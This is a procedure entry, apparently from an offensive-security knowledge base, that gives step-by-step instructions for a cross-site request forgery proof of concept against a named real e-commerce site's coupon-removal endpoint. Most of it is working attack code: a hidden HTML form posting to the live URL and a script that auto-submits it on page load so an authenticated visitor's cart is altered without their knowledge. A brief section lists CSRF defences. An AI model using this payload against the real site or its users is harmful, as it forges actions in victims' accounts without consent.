---
id: proc-uuid-67890
name: Craft-CSRF-Proof-of-Concept-to-Remove-Coupon
tags:
  - csrf
  - poc
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:35.539Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-CSRF-Proof-of-Concept-to-Remove-Coupon

## Summary

This procedure creates a malicious HTML webpage that exploits the missing CSRF token on the Teavana coupon removal endpoint, automatically submitting a form to remove a specified coupon from an authenticated user's cart without their knowledge.

## Description

Targeting the vulnerable POST endpoint on Teavana's Demandware platform, this PoC leverages the lack of CSRF validation to forge a request from a third-party site. When an authenticated victim visits the attacker's page, JavaScript auto-submits the form, altering the cart contents. This demonstrates session hijacking risks in e-commerce, though rated low severity due to limited impact. Requires knowledge of the target coupon code and victim authentication.

## Requirements

1. Knowledge of vulnerable endpoint URL
2. Specific coupon code to remove
3. Text editor to create HTML file
4. Authenticated browser session for testing

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens with unique, session-bound values
- Validate request origins and referer headers
- Log and alert on cart changes from external sources

## Objectives

1. Forge a request to remove a coupon via external form
2. Automate submission to bypass user interaction
3. Validate exploitation in a controlled environment

## Instructions

### Step 1: Create HTML Form

**Context**: Build the basic structure of the malicious page with a hidden form targeting the endpoint.

Use a text editor to create an HTML file:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<form id="csrf-form" action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon" method="POST">
<input type="hidden" name="couponCode" value="TARGET_COUPON_CODE">
</form>
</body>
</html>
```
Replace `TARGET_COUPON_CODE` with the actual coupon code.

### Step 2: Add Auto-Submission Script

**Context**: Use JavaScript to submit the form immediately on page load, simulating a drive-by attack.

Add the following script to the HTML body before the closing tag:

```html
<script>document.getElementById('csrf-form').submit();</script>
```

### Step 3: Test the PoC

**Context**: Load the page in a browser authenticated to Teavana to confirm coupon removal.

Save the file, open it in the browser (ensure same session as Teavana login), and verify the coupon is removed from the cart without manual input. Check cart for changes.

**Expected Output**: Automatic POST submission and coupon removal confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[poc]]
- [[web]]
